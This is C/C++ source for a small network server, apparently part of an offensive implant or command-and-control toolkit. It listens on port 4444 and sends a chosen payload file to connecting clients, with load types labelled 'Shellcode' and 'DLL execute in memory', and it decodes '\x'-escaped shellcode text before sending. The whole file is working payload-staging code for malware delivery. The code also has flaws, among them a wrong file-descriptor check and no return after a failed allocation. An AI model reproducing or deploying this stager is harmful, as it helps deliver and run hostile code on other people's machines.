#include "networking.h"
#include "crc32.hpp"
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>
#include <malloc.h>
#include <stdlib.h>
#include <string.h>

char * pszFileName;
uint32_t loadtype;

enum LOAD_TYPE
{
	PIC,
	IN_MEMORY,
	LOAD_MAX
};

typedef struct _blob_packet
{
	HEAD_PACKET head;
	LOAD_TYPE loadType;
	uint32_t payloadSize;
	uint32_t checksum;
} BLOB_PACKET, *PBLOB_PACKET;


static unsigned hexval(char c)
{
    if (c >= '0' && c <= '9')
        return c - '0';

    if (c >= 'a' && c <= 'f')
        return c - 'a' + 10;

    if (c >= 'A' && c <= 'F')
        return c - 'A' + 10;

    return ~0;
}

int str2bin(char *data, unsigned char **buf_ptr) 
{
        int len, converted = 0;
        unsigned int val;
        unsigned char *buf;

        buf = (unsigned char *) malloc(strlen(data) + 1);
        *buf_ptr = buf;

        for (; *data; ) {

                if (*data != '\\') 
		{
                        *buf++ = *data++;
                        continue;
                }

                if (data[1] != 'x' && data[1] != 'X')
                        return -1;

                val = (hexval(data[2]) << 4) | hexval(data[3]);
                if (val & ~0xff)
                        return -1;

                *buf++ = val;
                data += 4;
                ++converted; 
        }

        len = buf - *buf_ptr;
	return len;
}

void LoadBlob(int conn)
{
	HEAD_PACKET packet{};
	int bytesRead = recv(conn, (char *) &packet, sizeof(packet), MSG_WAITALL);

	if(bytesRead != sizeof(packet))
	{
		printf("[+] Read [0x%x] bytes expected [0x%x]\n", bytesRead, sizeof(packet));
		return;
	}

	int fd;
	fd = open(pszFileName, O_RDONLY);
	if(fd)
	{
		struct stat st;
		stat(pszFileName, &st);
		uint32_t filesize = st.st_size;
		if(filesize)
		{
			char * pFile = (char *) malloc(filesize);
			if(!pFile)
			{
				printf("[!] Failed to allocate [0x%x] bytes\n", filesize);
			}
			uint32_t res = read(fd, pFile, filesize);

			if(res != filesize)
			{
				printf("[!] Read [0x%x] bytes expected [0x%x]\n", res, filesize);
				free(pFile);
				return;
			}

			if(*pFile == '\\' && pFile[1] == 'x')
			{				
				unsigned char * pFileBack = NULL;
				int len = str2bin(pFile, &pFileBack);
				pFile = (char *) pFileBack;
				filesize = len;
				res = len;
			}
			uint32_t crc = crc32(1, pFile, filesize);
			BLOB_PACKET tosend{};
			tosend.checksum = crc;
			tosend.payloadSize = filesize;
			tosend.loadType = (LOAD_TYPE) loadtype;
			BuildAndSend(conn, PACKET_TYPE::LOAD_BLOB, (HEAD_PACKET *) &tosend, sizeof(tosend));
			send(conn, pFile, filesize, 0);
			free(pFile);
		}
		else
		{
			printf("[!] Invalid file size returned [0x%x]\n", filesize);
			return;
		}
	}
	else
	{
		printf("[!] Unable to open fd to %s\n", pszFileName);
		return;
	}

}


bool CheckArgs(int argc, char ** argv)
{
	if(argc >= 3)
	{
		struct stat st;
		if(stat(argv[1], &st) == 0)
		{
			pszFileName = argv[1];
			loadtype = atoi(argv[2]);
			if(loadtype >= LOAD_TYPE::LOAD_MAX)
			{
				printf("Invalid load type %d\n", loadtype);
			}
			else
			{
				return true;
			}
		}
		else
		{
			printf("Unable to open file %s\n", argv[1]);
		}

	
	}
	printf("Usage: ./thpd [module filename] [loadtype]\nLoad Type:\n\t0 -- Shellcode\n\t1 -- DLL execute in memory\n");
	return false;	

}

int main(int argc, char ** argv)
{
	if(CheckArgs(argc, argv))
	{
		int socket = StartupNetworking(4444);
		if(socket == INVALID_SOCKET)
		{
			return 2;
		}
		RegisterHandler(PACKET_TYPE::LOAD_BLOB, (void *) LoadBlob);
		StartListening(socket);
	}
	return 1;
}
